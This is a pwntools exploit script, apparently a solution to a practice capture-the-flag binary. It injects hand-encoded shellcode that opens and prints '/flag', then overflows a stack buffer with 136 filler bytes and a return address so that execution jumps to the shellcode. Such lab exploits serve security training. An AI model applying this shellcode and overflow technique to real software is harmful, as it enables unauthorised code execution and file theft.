import pwn
import pwnlib.shellcraft as shellcraft
import pwnlib.asm as asm

proc = pwn.process("/challenge/toddlerone_level1.0")


shellcode = b"\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x67\x6d\x60\x66\x01\x01\x01\x48\x31\x04\x24\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"

proc.recvuntil("shellcode from stdin.")
proc.sendline(shellcode)

proc.recvuntil("size:")
proc.sendline("144")

ret_addr = pwn.p64(0x2a2ac000, endian='little')
payload = b"a"*136 + ret_addr
proc.recvuntil("bytes)!")
proc.send(payload)
proc.interactive()

